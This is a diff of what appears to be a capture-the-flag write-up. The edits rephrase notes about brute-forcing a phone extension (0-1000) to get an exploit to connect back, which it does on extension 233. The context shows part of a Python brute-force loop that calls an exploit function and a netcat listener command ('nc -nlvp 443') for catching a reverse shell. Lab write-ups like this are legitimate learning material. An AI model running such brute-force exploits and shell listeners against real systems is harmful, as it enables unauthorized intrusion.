@@ -137,7 +137,7 @@ What variables do we have?
 - lport, can't change
 - extension, can change.
 
-So lets try changing the extension. But first we need to figure out what the extension actually is. It's essentially an additional telephone wired to the same telephone line as another. And can be up to 4 digits long. So I created a little brute-force that just runs through 0-1000. with a 
+So lets try changing the extension. But first we need to figure out what the extension actually is. It's essentially an additional telephone wired to the same telephone line as another. And can be up to 4 digits long. So I created a little brute-force that just runs through 0-1000. 
 
 ```
 import urllib.request
@@ -167,7 +167,7 @@ for i in extensions:
     expl(i)
 ```
 
-It took a while, but I got the connection on extension number 233.
+It took a while, but I got the connection on extension number 233. Probably not the fastest solution, but it worked. 
 
 ```
 kali@kali:~$ sudo rlwrap nc -nlvp 443
